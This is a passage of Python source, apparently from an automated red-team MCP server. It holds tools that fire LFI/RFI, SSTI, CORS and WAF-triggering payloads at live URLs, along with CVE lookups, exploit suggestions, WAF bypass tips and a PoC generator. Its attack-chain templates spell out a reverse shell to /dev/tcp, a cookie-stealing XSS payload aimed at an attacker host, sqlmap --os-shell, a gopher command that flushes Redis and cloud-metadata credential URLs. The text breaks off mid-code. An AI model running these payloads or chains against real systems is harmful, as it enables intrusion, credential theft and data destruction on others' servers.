        "success": True,
        "url": url,
        "vulnerable": len(findings) > 0,
        "ssti_vulns": findings,
        "recommendations": [
            "避免将用户输入直接传入模板引擎",
            "使用沙箱模式渲染模板",
            "对用户输入进行严格过滤"
        ] if findings else []
    }


@mcp.tool()
def lfi_detect(url: str, param: str = None) -> dict:
    """LFI/RFI文件包含检测 - 检测本地/远程文件包含漏洞"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    findings = []

    # LFI payload
    lfi_payloads = [
        ("../../../etc/passwd", "root:"),
        ("....//....//....//etc/passwd", "root:"),
        ("..%2f..%2f..%2fetc/passwd", "root:"),
        ("..%252f..%252f..%252fetc/passwd", "root:"),
        ("/etc/passwd", "root:"),
        ("....\\....\\....\\windows\\win.ini", "[fonts]"),
        ("..\\..\\..\\windows\\win.ini", "[fonts]"),
        ("C:\\windows\\win.ini", "[fonts]"),
        ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),
        ("php://filter/read=string.rot13/resource=index.php", "<?cuc"),
    ]

    # RFI payload (使用安全的测试URL)
    rfi_payloads = [
        "http://evil.com/shell.txt",
        "https://evil.com/shell.txt",
        "//evil.com/shell.txt",
    ]

    try:
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        params = []
        if param:
            params = [param]
        elif parsed.query:
            params = [p.split('=')[0] for p in parsed.query.split('&') if '=' in p]

        if not params:
            params = ["file", "page", "include", "path", "doc", "document", "folder", "root", "pg", "style", "template", "php_path", "lang"]

        for p in params[:5]:
            # LFI测试
            for payload, indicator in lfi_payloads:
                try:
                    test_url = f"{base_url}?{p}={requests.utils.quote(payload)}"
                    resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

                    if indicator in resp.text:
                        findings.append({
                            "type": "LFI",
                            "param": p,
                            "payload": payload,
                            "severity": "CRITICAL",
                            "detail": "本地文件包含漏洞"
                        })
                        break
                except Exception:
                    pass

            # RFI测试 (检测是否尝试外连)
            for payload in rfi_payloads:
                try:
                    test_url = f"{base_url}?{p}={requests.utils.quote(payload)}"
                    resp = requests.get(test_url, timeout=5, verify=get_verify_ssl())

                    # 检测错误信息中是否包含远程URL
                    if "evil.com" in resp.text or "failed to open stream" in resp.text:
                        findings.append({
                            "type": "RFI_Potential",
                            "param": p,
                            "payload": payload,
                            "severity": "HIGH",
                            "detail": "可能存在远程文件包含漏洞"
                        })
                        break
                except Exception:
                    pass

    except Exception as e:
        return {"success": False, "error": str(e)}

    return {
        "success": True,
        "url": url,
        "vulnerable": len(findings) > 0,
        "lfi_vulns": findings,
        "recommendations": [
            "使用白名单限制可包含的文件",
            "禁用allow_url_include",
            "对文件路径进行严格过滤"
        ] if findings else []
    }


@mcp.tool()
def waf_detect(url: str) -> dict:
    """WAF检测 - 识别目标使用的Web应用防火墙"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    waf_signatures = {
        "Cloudflare": {
            "headers": ["cf-ray", "cf-cache-status", "__cfduid"],
            "body": ["cloudflare", "attention required"],
            "cookies": ["__cfduid", "cf_clearance"]
        },
        "AWS WAF": {
            "headers": ["x-amzn-requestid", "x-amz-cf-id"],
            "body": ["aws", "amazon"]
        },
        "Akamai": {
            "headers": ["akamai", "x-akamai"],
            "body": ["akamai", "reference #"]
        },
        "ModSecurity": {
            "headers": ["mod_security", "modsecurity"],
            "body": ["mod_security", "modsecurity", "not acceptable"]
        },
        "Imperva/Incapsula": {
            "headers": ["x-iinfo", "x-cdn"],
            "cookies": ["incap_ses", "visid_incap"]
        },
        "F5 BIG-IP": {
            "headers": ["x-wa-info"],
            "cookies": ["bigipserver", "ts"]
        },
        "Sucuri": {
            "headers": ["x-sucuri-id", "x-sucuri-cache"],
            "body": ["sucuri", "cloudproxy"]
        },
        "Barracuda": {
            "headers": ["barra_counter_session"],
            "body": ["barracuda"]
        },
        "Fortinet/FortiWeb": {
            "headers": ["fortiwafsid"],
            "cookies": ["cookiesession1"]
        },
        "阿里云WAF": {
            "headers": ["ali-swift-global-savetime"],
            "body": ["aliyun", "errors.aliyun.com"]
        },
        "腾讯云WAF": {
            "headers": ["tencent"],
            "body": ["waf.tencent-cloud.com"]
        },
        "百度云加速": {
            "headers": ["yunjiasu"],
            "body": ["yunjiasu"]
        },
    }

    detected_wafs = []
    test_results = {}

    try:
        # 正常请求
        normal_resp = requests.get(url, timeout=10, verify=get_verify_ssl())
        test_results["normal"] = {
            "status": normal_resp.status_code,
            "headers": dict(normal_resp.headers)
        }

        # 恶意请求触发WAF
        malicious_payloads = [
            "?id=1' OR '1'='1",
            "?id=<script>alert(1)</script>",
            "?id=../../../etc/passwd",
            "?id=;cat /etc/passwd",
        ]

        for payload in malicious_payloads:
            try:
                mal_resp = requests.get(url + payload, timeout=10, verify=get_verify_ssl())
                test_results[f"malicious_{payload[:20]}"] = mal_resp.status_code
            except Exception:
                pass

        # 检测WAF特征
        headers_lower = {k.lower(): v.lower() for k, v in normal_resp.headers.items()}
        body_lower = normal_resp.text.lower()
        cookies = normal_resp.cookies.get_dict()

        for waf_name, signatures in waf_signatures.items():
            confidence = 0

            # 检查headers
            for h in signatures.get("headers", []):
                if h.lower() in headers_lower:
                    confidence += 40

            # 检查body
            for b in signatures.get("body", []):
                if b.lower() in body_lower:
                    confidence += 30

            # 检查cookies
            for c in signatures.get("cookies", []):
                if c.lower() in [k.lower() for k in cookies.keys()]:
                    confidence += 30

            if confidence >= 30:
                detected_wafs.append({
                    "waf": waf_name,
                    "confidence": min(confidence, 100),
                    "evidence": "Header/Body/Cookie匹配"
                })

        # 检测通用WAF行为
        if normal_resp.status_code == 200:
            for payload in malicious_payloads:
                try:
                    mal_resp = requests.get(url + payload, timeout=10, verify=get_verify_ssl())
                    if mal_resp.status_code in [403, 406, 429, 503]:
                        if not detected_wafs:
                            detected_wafs.append({
                                "waf": "Unknown WAF",
                                "confidence": 60,
                                "evidence": f"恶意请求被拦截 (HTTP {mal_resp.status_code})"
                            })
                        break
                except Exception:
                    pass

    except Exception as e:
        return {"success": False, "error": str(e)}

    # WAF绕过建议
    bypass_tips = []
    if detected_wafs:
        bypass_tips = [
            "尝试大小写混淆: SeLeCt, UnIoN",
            "使用编码绕过: URL编码, Unicode编码",
            "使用注释混淆: /**/SELECT/**/",
            "使用等价函数替换",
            "分块传输编码绕过",
            "HTTP参数污染",
        ]

    return {
        "success": True,
        "url": url,
        "waf_detected": len(detected_wafs) > 0,
        "detected_wafs": detected_wafs,
        "bypass_tips": bypass_tips,
        "test_results": test_results
    }


@mcp.tool()
def cors_deep_check(url: str) -> dict:
    """CORS深度检测 - 检测跨域资源共享配置漏洞"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    findings = []

    test_origins = [
        "https://evil.com",
        "https://attacker.com",
        "null",
        "https://target.com.evil.com",
        url.replace("https://", "https://evil.").replace("http://", "http://evil."),
    ]

    try:
        # 基础请求
        base_resp = requests.get(url, timeout=10, verify=get_verify_ssl())

        for origin in test_origins:
            try:
                headers = {"Origin": origin}
                resp = requests.get(url, headers=headers, timeout=10, verify=get_verify_ssl())

                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")

                if acao == "*":
                    findings.append({
                        "type": "Wildcard Origin",
                        "origin": origin,
                        "acao": acao,
                        "severity": "MEDIUM",
                        "detail": "允许任意来源访问"
                    })
                elif acao == origin:
                    severity = "HIGH" if acac.lower() == "true" else "MEDIUM"
                    findings.append({
                        "type": "Origin Reflection",
                        "origin": origin,
                        "acao": acao,
                        "acac": acac,
                        "severity": severity,
                        "detail": "反射任意Origin" + ("且允许携带凭证" if acac.lower() == "true" else "")
                    })
                elif origin == "null" and acao == "null":
                    findings.append({
                        "type": "Null Origin Allowed",
                        "severity": "HIGH",
                        "detail": "允许null来源，可通过iframe沙箱利用"
                    })

            except Exception:
                pass

    except Exception as e:
        return {"success": False, "error": str(e)}

    return {
        "success": True,
        "url": url,
        "vulnerable": len(findings) > 0,
        "cors_vulns": findings,
        "recommendations": [
            "使用白名单验证Origin",
            "避免反射任意Origin",
            "谨慎使用Access-Control-Allow-Credentials",
            "不要允许null来源"
        ] if findings else []
    }


# ==================== 全局配置 ====================

# 代理配置
PROXY_CONFIG = {
    "enabled": False,
    "http": None,
    "https": None
}


@mcp.tool()
def set_config(verify_ssl: bool = None, rate_limit_delay: float = None, max_threads: int = None, request_timeout: int = None) -> dict:
    """配置管理 - 动态调整全局配置

    Args:
        verify_ssl: SSL证书验证开关 (True/False)
        rate_limit_delay: 请求间隔秒数 (0.1-5.0)
        max_threads: 最大并发线程数 (1-100)
        request_timeout: 请求超时秒数 (5-60)
    """
    global GLOBAL_CONFIG
    changes = []

    if verify_ssl is not None:
        GLOBAL_CONFIG["verify_ssl"] = verify_ssl
        changes.append(f"verify_ssl: {verify_ssl}")

    if rate_limit_delay is not None:
        GLOBAL_CONFIG["rate_limit_delay"] = max(0.1, min(5.0, rate_limit_delay))
        changes.append(f"rate_limit_delay: {GLOBAL_CONFIG['rate_limit_delay']}s")

    if max_threads is not None:
        GLOBAL_CONFIG["max_threads"] = max(1, min(100, max_threads))
        changes.append(f"max_threads: {GLOBAL_CONFIG['max_threads']}")

    if request_timeout is not None:
        GLOBAL_CONFIG["request_timeout"] = max(5, min(60, request_timeout))
        changes.append(f"request_timeout: {GLOBAL_CONFIG['request_timeout']}s")

    return {
        "success": True,
        "changes": changes if changes else ["无更改"],
        "current_config": GLOBAL_CONFIG.copy()
    }


@mcp.tool()
def set_proxy(proxy_url: str = None, enabled: bool = True) -> dict:
    """设置全局代理 - 所有HTTP请求将通过代理发送

    Args:
        proxy_url: 代理地址 (如 http://127.0.0.1:8080, socks5://127.0.0.1:1080)
        enabled: 是否启用代理
    """
    global PROXY_CONFIG

    if proxy_url:
        PROXY_CONFIG["http"] = proxy_url
        PROXY_CONFIG["https"] = proxy_url
        PROXY_CONFIG["enabled"] = enabled
        return {
            "success": True,
            "message": f"代理已{'启用' if enabled else '禁用'}",
            "proxy": proxy_url
        }
    else:
        PROXY_CONFIG["enabled"] = False
        PROXY_CONFIG["http"] = None
        PROXY_CONFIG["https"] = None
        return {
            "success": True,
            "message": "代理已清除"
        }


def get_proxies():
    """获取当前代理配置"""
    if PROXY_CONFIG["enabled"] and PROXY_CONFIG["http"]:
        return {
            "http": PROXY_CONFIG["http"],
            "https": PROXY_CONFIG["https"]
        }
    return None


@mcp.tool()
def http_request(url: str, method: str = "GET", headers: dict = None, data: str = None, use_proxy: bool = True) -> dict:
    """通用HTTP请求 - 支持代理、自定义头、POST数据

    Args:
        url: 请求URL
        method: 请求方法 (GET/POST/PUT/DELETE)
        headers: 自定义请求头 (JSON格式)
        data: POST数据
        use_proxy: 是否使用代理
    """
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    try:
        proxies = get_proxies() if use_proxy else None
        req_headers = headers or {}

        if method.upper() == "GET":
            resp = requests.get(url, headers=req_headers, proxies=proxies, timeout=30, verify=get_verify_ssl())
        elif method.upper() == "POST":
            resp = requests.post(url, headers=req_headers, data=data, proxies=proxies, timeout=30, verify=get_verify_ssl())
        elif method.upper() == "PUT":
            resp = requests.put(url, headers=req_headers, data=data, proxies=proxies, timeout=30, verify=get_verify_ssl())
        elif method.upper() == "DELETE":
            resp = requests.delete(url, headers=req_headers, proxies=proxies, timeout=30, verify=get_verify_ssl())
        else:
            return {"success": False, "error": f"不支持的方法: {method}"}

        return {
            "success": True,
            "status_code": resp.status_code,
            "headers": dict(resp.headers),
            "body": resp.text[:5000],
            "cookies": resp.cookies.get_dict(),
            "elapsed": resp.elapsed.total_seconds()
        }

    except Exception as e:
        return {"success": False, "error": str(e)}


@mcp.tool()
def cve_search(keyword: str, year: str = None, source: str = "all") -> dict:
    """CVE实时搜索 - 从多个数据源搜索最新漏洞信息

    Args:
        keyword: 搜索关键词 (如 wordpress, apache, spring)
        year: 筛选年份 (如 2024, 2025)
        source: 数据源 (nvd/github/circl/all)
    """
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    results = []
    errors = []

    # 1. NVD (National Vulnerability Database) - 官方数据源
    if source in ["nvd", "all"]:
        try:
            nvd_url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={keyword}&resultsPerPage=20"
            resp = requests.get(nvd_url, timeout=15, headers={"User-Agent": "AutoRedTeam/2.0"})
            if resp.status_code == 200:
                data = resp.json()
                for item in data.get("vulnerabilities", [])[:15]:
                    cve = item.get("cve", {})
                    cve_id = cve.get("id", "")
                    if year and year not in cve_id:
                        continue

                    # 获取CVSS分数
                    cvss = "N/A"
                    metrics = cve.get("metrics", {})
                    if metrics.get("cvssMetricV31"):
                        cvss = metrics["cvssMetricV31"][0].get("cvssData", {}).get("baseScore", "N/A")
                    elif metrics.get("cvssMetricV30"):
                        cvss = metrics["cvssMetricV30"][0].get("cvssData", {}).get("baseScore", "N/A")

                    # 获取描述
                    desc = ""
                    for d in cve.get("descriptions", []):
                        if d.get("lang") == "en":
                            desc = d.get("value", "")[:200]
                            break

                    results.append({
                        "cve_id": cve_id,
                        "source": "NVD",
                        "cvss": cvss,
                        "summary": desc,
                        "published": cve.get("published", "")[:10]
                    })
        except Exception as e:
            errors.append(f"NVD: {str(e)}")

    # 2. GitHub Advisory Database
    if source in ["github", "all"]:
        try:
            gh_url = f"https://api.github.com/advisories?keyword={keyword}&per_page=15"
            resp = requests.get(gh_url, timeout=15, headers={
                "Accept": "application/vnd.github+json",
                "User-Agent": "AutoRedTeam/2.0"
            })
            if resp.status_code == 200:
                for item in resp.json()[:10]:
                    cve_id = item.get("cve_id") or item.get("ghsa_id", "")
                    if year and year not in str(item.get("published_at", "")):
                        continue

                    severity = item.get("severity", "unknown").upper()
                    cvss = {"CRITICAL": 9.0, "HIGH": 7.5, "MEDIUM": 5.0, "LOW": 2.5}.get(severity, "N/A")

                    results.append({
                        "cve_id": cve_id,
                        "source": "GitHub",
                        "cvss": cvss,
                        "severity": severity,
                        "summary": item.get("summary", "")[:200],
                        "published": item.get("published_at", "")[:10]
                    })
        except Exception as e:
            errors.append(f"GitHub: {str(e)}")

    # 3. CVE.circl.lu (备用)
    if source in ["circl", "all"] and len(results) < 5:
        try:
            circl_url = f"https://cve.circl.lu/api/search/{keyword}"
            resp = requests.get(circl_url, timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                for item in data[:10]:
                    cve_id = item.get("id", "")
                    if year and year not in cve_id:
                        continue
                    if not any(r["cve_id"] == cve_id for r in results):  # 去重
                        results.append({
                            "cve_id": cve_id,
                            "source": "CIRCL",
                            "cvss": item.get("cvss", "N/A"),
                            "summary": item.get("summary", "")[:200]
                        })
        except Exception as e:
            errors.append(f"CIRCL: {str(e)}")

    # 按CVSS分数排序
    def get_cvss(x):
        try:
            return float(x.get("cvss", 0))
        except Exception:
            return 0
    results.sort(key=get_cvss, reverse=True)

    return {
        "success": True,
        "keyword": keyword,
        "year_filter": year,
        "results": results[:20],
        "total": len(results),
        "sources_queried": source,
        "errors": errors if errors else None
    }

@mcp.tool()
def cve_detail(cve_id: str) -> dict:
    """获取CVE详细信息 - 包括漏洞描述、CVSS、受影响版本、参考链接"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    try:
        # 从NVD获取详细信息
        nvd_url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
        resp = requests.get(nvd_url, timeout=15, headers={"User-Agent": "AutoRedTeam/2.0"})

        if resp.status_code != 200:
            return {"success": False, "error": f"NVD API返回 {resp.status_code}"}

        data = resp.json()
        vulns = data.get("vulnerabilities", [])
        if not vulns:
            return {"success": False, "error": f"未找到 {cve_id}"}

        cve = vulns[0].get("cve", {})

        # 解析CVSS
        cvss_info = {}
        metrics = cve.get("metrics", {})
        if metrics.get("cvssMetricV31"):
            cvss_data = metrics["cvssMetricV31"][0].get("cvssData", {})
            cvss_info = {
                "version": "3.1",
                "score": cvss_data.get("baseScore"),
                "severity": cvss_data.get("baseSeverity"),
                "vector": cvss_data.get("vectorString")
            }

        # 解析描述
        description = ""
        for d in cve.get("descriptions", []):
            if d.get("lang") == "en":
                description = d.get("value", "")
                break

        # 解析受影响产品
        affected = []
        for config in cve.get("configurations", []):
            for node in config.get("nodes", []):
                for match in node.get("cpeMatch", []):
                    if match.get("vulnerable"):
                        affected.append(match.get("criteria", ""))

        # 解析参考链接
        references = []
        for ref in cve.get("references", [])[:10]:
            references.append({
                "url": ref.get("url"),
                "tags": ref.get("tags", [])
            })

        return {
            "success": True,
            "cve_id": cve_id,
            "description": description,
            "cvss": cvss_info,
            "published": cve.get("published", "")[:10],
            "modified": cve.get("lastModified", "")[:10],
            "affected_products": affected[:10],
            "references": references,
            "weaknesses": [w.get("description", [{}])[0].get("value") for w in cve.get("weaknesses", [])]
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

@mcp.tool()
def cve_recent(days: int = 7, severity: str = None) -> dict:
    """获取最近发布的CVE漏洞

    Args:
        days: 最近几天 (默认7天)
        severity: 严重性筛选 (CRITICAL/HIGH/MEDIUM/LOW)
    """
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    from datetime import datetime, timedelta

    end_date = datetime.now()
    start_date = end_date - timedelta(days=days)

    try:
        nvd_url = (
            f"https://services.nvd.nist.gov/rest/json/cves/2.0?"
            f"pubStartDate={start_date.strftime('%Y-%m-%dT00:00:00.000')}&"
            f"pubEndDate={end_date.strftime('%Y-%m-%dT23:59:59.999')}&"
            f"resultsPerPage=50"
        )

        resp = requests.get(nvd_url, timeout=20, headers={"User-Agent": "AutoRedTeam/2.0"})

        if resp.status_code != 200:
            return {"success": False, "error": f"NVD API返回 {resp.status_code}"}

        data = resp.json()
        results = []

        for item in data.get("vulnerabilities", []):
            cve = item.get("cve", {})

            # 获取CVSS
            cvss_score = 0
            cvss_severity = "UNKNOWN"
            metrics = cve.get("metrics", {})
            if metrics.get("cvssMetricV31"):
                cvss_data = metrics["cvssMetricV31"][0].get("cvssData", {})
                cvss_score = cvss_data.get("baseScore", 0)
                cvss_severity = cvss_data.get("baseSeverity", "UNKNOWN")

            # 严重性筛选
            if severity and cvss_severity != severity.upper():
                continue

            # 获取描述
            desc = ""
            for d in cve.get("descriptions", []):
                if d.get("lang") == "en":
                    desc = d.get("value", "")[:150]
                    break

            results.append({
                "cve_id": cve.get("id"),
                "cvss": cvss_score,
                "severity": cvss_severity,
                "summary": desc,
                "published": cve.get("published", "")[:10]
            })

        # 按CVSS排序
        results.sort(key=lambda x: x.get("cvss", 0), reverse=True)

        return {
            "success": True,
            "period": f"最近{days}天",
            "severity_filter": severity,
            "results": results[:30],
            "total": len(results)
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

# ========== 智能增强功能 ==========

@mcp.tool()
def smart_exploit_suggest(target: str) -> dict:
    """智能漏洞利用建议 - 检测技术栈并推荐针对性利用方法"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    result = {
        "target": target,
        "detected_tech": [],
        "cve_matches": [],
        "exploit_suggestions": [],
        "attack_vectors": []
    }

    # 解析目标
    if not target.startswith("http"):
        target = f"https://{target}"

    # 1. 技术栈检测
    tech_result = tech_detect(target)
    if not tech_result.get("success"):
        return {"success": False, "error": "技术栈检测失败"}

    tech = tech_result.get("technology", {})

    # 收集检测到的技术
    detected = []
    if tech.get("server"):
        detected.append({"type": "server", "name": tech["server"]})
    if tech.get("powered_by"):
        detected.append({"type": "framework", "name": tech["powered_by"]})
    for cms in tech.get("cms", []):
        detected.append({"type": "cms", "name": cms})
    for fw in tech.get("frameworks", []):
        detected.append({"type": "framework", "name": fw})

    result["detected_tech"] = detected

    # 2. 针对每个技术搜索CVE并生成利用建议
    exploit_db = {
        "WordPress": {
            "common_vulns": ["插件漏洞", "主题漏洞", "xmlrpc攻击", "用户枚举"],
            "attack_vectors": [
                "尝试 /wp-admin 弱口令爆破",
                "检测 /xmlrpc.php 是否开启",
                "枚举 /wp-json/wp/v2/users 获取用户名",
                "扫描已知漏洞插件: contact-form-7, elementor, woocommerce"
            ],
            "tools": ["wpscan", "nuclei -t wordpress"]
        },
        "ThinkPHP": {
            "common_vulns": ["RCE (5.0.x/5.1.x)", "SQL注入", "文件包含"],
            "attack_vectors": [
                "测试 ThinkPHP 5.x RCE: /index.php?s=/index/\\think\\app/invokefunction",
                "检测调试模式是否开启",
                "尝试日志文件泄露"
            ],
            "tools": ["ThinkPHP RCE检测脚本"]
        },
        "Spring": {
            "common_vulns": ["Spring4Shell", "SpEL注入", "Actuator泄露"],
            "attack_vectors": [
                "检测 /actuator/env 信息泄露",
                "测试 Spring4Shell (CVE-2022-22965)",
                "检测 /actuator/heapdump 内存泄露"
            ],
            "tools": ["nuclei -t spring"]
        },
        "Apache": {
            "common_vulns": ["路径遍历", "请求走私", "mod_proxy SSRF"],
            "attack_vectors": [
                "测试路径遍历: /.%2e/.%2e/etc/passwd",
                "检测 server-status 信息泄露",
                "测试 mod_proxy SSRF"
            ],
            "tools": ["nuclei -t apache"]
        },
        "Nginx": {
            "common_vulns": ["配置错误", "路径遍历", "CRLF注入"],
            "attack_vectors": [
                "测试 alias 路径遍历",
                "检测 nginx.conf 泄露",
                "测试 CRLF 注入"
            ],
            "tools": ["gixy", "nuclei -t nginx"]
        },
        "Laravel": {
            "common_vulns": ["调试模式RCE", "反序列化", "SQL注入"],
            "attack_vectors": [
                "检测 APP_DEBUG=true 调试模式",
                "测试 /_ignition/execute-solution RCE",
                "检测 .env 文件泄露"
            ],
            "tools": ["nuclei -t laravel"]
        },
        "Django": {
            "common_vulns": ["调试模式信息泄露", "SQL注入", "SSTI"],
            "attack_vectors": [
                "检测 DEBUG=True 调试页面",
                "测试 SSTI: {{7*7}}",
                "检测 /admin 后台"
            ],
            "tools": ["nuclei -t django"]
        },
        "Tomcat": {
            "common_vulns": ["管理后台弱口令", "文件上传", "AJP漏洞"],
            "attack_vectors": [
                "尝试 /manager/html 默认凭据 (tomcat:tomcat)",
                "测试 Ghostcat (CVE-2020-1938)",
                "检测 /examples 示例应用"
            ],
            "tools": ["nuclei -t tomcat"]
        }
    }

    for tech_item in detected:
        tech_name = tech_item["name"]

        # 搜索相关CVE
        try:
            cve_result = cve_search(tech_name, source="nvd")
            if cve_result.get("success") and cve_result.get("results"):
                for cve in cve_result["results"][:5]:
                    result["cve_matches"].append({
                        "tech": tech_name,
                        "cve_id": cve.get("cve_id"),
                        "cvss": cve.get("cvss"),
                        "summary": cve.get("summary", "")[:100]
                    })
        except Exception:
            pass

        # 匹配利用建议
        for key, exploits in exploit_db.items():
            if key.lower() in tech_name.lower():
                result["exploit_suggestions"].append({
                    "tech": tech_name,
                    "common_vulns": exploits["common_vulns"],
                    "recommended_tools": exploits.get("tools", [])
                })
                result["attack_vectors"].extend(exploits["attack_vectors"])

    # 去重攻击向量
    result["attack_vectors"] = list(set(result["attack_vectors"]))

    return {"success": True, "data": result}

@mcp.tool()
def attack_chain_plan(vulns: list) -> dict:
    """自动化攻击链规划 - 根据发现的漏洞生成攻击链

    Args:
        vulns: 漏洞列表，如 ["sqli", "xss", "file_upload", "ssrf"]
    """
    # 攻击链模板
    chain_templates = {
        "sqli": {
            "phase": "Initial Access",
            "next_steps": [
                {"action": "数据提取", "detail": "使用UNION注入提取数据库信息", "commands": ["sqlmap -u URL --dbs", "sqlmap -u URL -D db --tables"]},
                {"action": "权限提升", "detail": "尝试读取敏感文件或执行命令", "commands": ["sqlmap -u URL --file-read=/etc/passwd", "sqlmap -u URL --os-shell"]},
                {"action": "横向移动", "detail": "获取数据库凭据后尝试登录其他服务", "commands": ["使用获取的凭据尝试SSH/RDP"]}
            ],
            "post_exploit": ["提取用户凭据", "查找配置文件", "数据库备份"]
        },
        "xss": {
            "phase": "Initial Access",
            "next_steps": [
                {"action": "会话劫持", "detail": "窃取管理员Cookie", "commands": ["<script>new Image().src='http://attacker/steal?c='+document.cookie</script>"]},
                {"action": "钓鱼攻击", "detail": "注入虚假登录表单", "commands": ["注入伪造的登录框获取凭据"]},
                {"action": "键盘记录", "detail": "注入键盘记录脚本", "commands": ["注入keylogger.js"]}
            ],
            "post_exploit": ["获取管理员权限", "进一步渗透内网"]
        },
        "file_upload": {
            "phase": "Initial Access",
            "next_steps": [
                {"action": "Webshell上传", "detail": "上传PHP/JSP/ASP木马", "commands": ["上传 shell.php", "访问 /uploads/shell.php?cmd=id"]},
                {"action": "反弹Shell", "detail": "获取交互式Shell", "commands": ["nc -lvp 4444", "bash -i >& /dev/tcp/IP/4444 0>&1"]},
                {"action": "权限提升", "detail": "本地提权", "commands": ["sudo -l", "find / -perm -4000 2>/dev/null"]}
            ],
            "post_exploit": ["持久化后门", "内网扫描", "数据窃取"]
        },
        "ssrf": {
            "phase": "Initial Access",
            "next_steps": [
                {"action": "内网探测", "detail": "扫描内网服务", "commands": ["探测 http://127.0.0.1:22", "探测 http://192.168.1.1"]},
                {"action": "云元数据", "detail": "获取云服务凭据", "commands": ["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/"]},
                {"action": "服务攻击", "detail": "攻击内网Redis/MySQL等", "commands": ["gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall"]}
            ],
            "post_exploit": ["获取云凭据", "攻击内网服务", "横向移动"]
        },
        "cmd_inject": {
            "phase": "Initial Access",
            "next_steps": [
                {"action": "反弹Shell", "detail": "获取交互式访问", "commands": ["bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"]},
                {"action": "信息收集", "detail": "收集系统信息", "commands": ["id; uname -a; cat /etc/passwd"]},
                {"action": "权限提升", "detail": "本地提权", "commands": ["sudo -l", "cat /etc/crontab"]}
            ],
            "post_exploit": ["持久化", "横向移动", "数据窃取"]
        },
        "xxe": {
            "phase": "Initial Access",
            "next_steps": [
                {"action": "文件读取", "detail": "读取敏感文件", "commands": ["<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"]},
                {"action": "SSRF", "detail": "探测内网", "commands": ["<!ENTITY xxe SYSTEM 'http://internal-server/'>"]},
                {"action": "DoS", "detail": "Billion Laughs攻击", "commands": ["递归实体定义"]}
            ],
            "post_exploit": ["获取配置文件", "内网渗透"]
        },
        "idor": {
            "phase": "Privilege Escalation",
            "next_steps": [
                {"action": "数据泄露", "detail": "遍历获取其他用户数据", "commands": ["修改id参数: ?id=1, ?id=2, ..."]},
                {"action": "权限提升", "detail": "访问管理员资源", "commands": ["尝试访问 ?role=admin, ?user_id=1"]},
                {"action": "账户接管", "detail": "修改其他用户信息", "commands": ["PUT /api/user/1 修改密码"]}
            ],
            "post_exploit": ["批量数据提取", "账户接管"]
        },
        "auth_bypass": {
            "phase": "Initial Access",
            "next_steps": [
                {"action": "管理后台访问", "detail": "直接访问管理功能", "commands": ["访问绕过后的管理页面"]},
                {"action": "功能滥用", "detail": "执行管理操作", "commands": ["创建管理员账户", "修改系统配置"]},
                {"action": "数据访问", "detail": "访问敏感数据", "commands": ["导出用户数据", "查看系统日志"]}
            ],
            "post_exploit": ["创建后门账户", "持久化访问"]
        }
    }

    attack_chain = {
        "vulns_input": vulns,
        "attack_phases": [],
        "recommended_sequence": [],
        "post_exploit_goals": []
    }

    # 根据漏洞生成攻击链
    for vuln in vulns:
        vuln_lower = vuln.lower().replace(" ", "_").replace("-", "_")
        for key, template in chain_templates.items():
            if key in vuln_lower or vuln_lower in key:
                attack_chain["attack_phases"].append({
                    "vulnerability": vuln,
                    "phase": template["phase"],
                    "next_steps": template["next_steps"],
                    "post_exploit": template["post_exploit"]
                })
                attack_chain["post_exploit_goals"].extend(template["post_exploit"])
                break

    # 生成推荐攻击序列
    phase_order = ["Initial Access", "Execution", "Privilege Escalation", "Lateral Movement", "Data Exfiltration"]
    for phase in phase_order:
        for ap in attack_chain["attack_phases"]:
            if ap["phase"] == phase:
                attack_chain["recommended_sequence"].append({
                    "step": len(attack_chain["recommended_sequence"]) + 1,
                    "vuln": ap["vulnerability"],
                    "phase": phase,
                    "action": ap["next_steps"][0]["action"] if ap["next_steps"] else "利用漏洞"
                })

    # 去重
    attack_chain["post_exploit_goals"] = list(set(attack_chain["post_exploit_goals"]))

    return {"success": True, "attack_chain": attack_chain}

@mcp.tool()
def poc_generator(vuln_type: str, target: str = "TARGET", param: str = "PARAM") -> dict:
    """PoC模板生成 - 根据漏洞类型生成基础PoC代码框架

    Args:
        vuln_type: 漏洞类型 (sqli/xss/ssrf/xxe/cmd_inject/file_upload/idor/csrf)
        target: 目标URL
        param: 漏洞参数
    """
    poc_templates = {
        "sqli": {
            "name": "SQL Injection PoC",
            "python": f'''#!/usr/bin/env python3
"""SQL Injection PoC"""
import requests

TARGET = "{target}"
PARAM = "{param}"

# 测试payload
payloads = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "' AND SLEEP(5)--"
]

for payload in payloads:
    url = f"{{TARGET}}?{{PARAM}}={{payload}}"
    try:
        resp = requests.get(url, timeout=10)
        print(f"[*] Testing: {{payload[:30]}}...")
        print(f"    Status: {{resp.status_code}}, Length: {{len(resp.text)}}")
    except Exception as e:
        print(f"[-] Error: {{e}}")
''',
            "curl": f'curl "{target}?{param}=\' OR \'1\'=\'1"'
        },
        "xss": {
            "name": "XSS PoC",
            "python": f'''#!/usr/bin/env python3
"""XSS PoC"""
import requests
from urllib.parse import quote

TARGET = "{target}"
PARAM = "{param}"

payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><script>alert(1)</script>"
]

for payload in payloads:
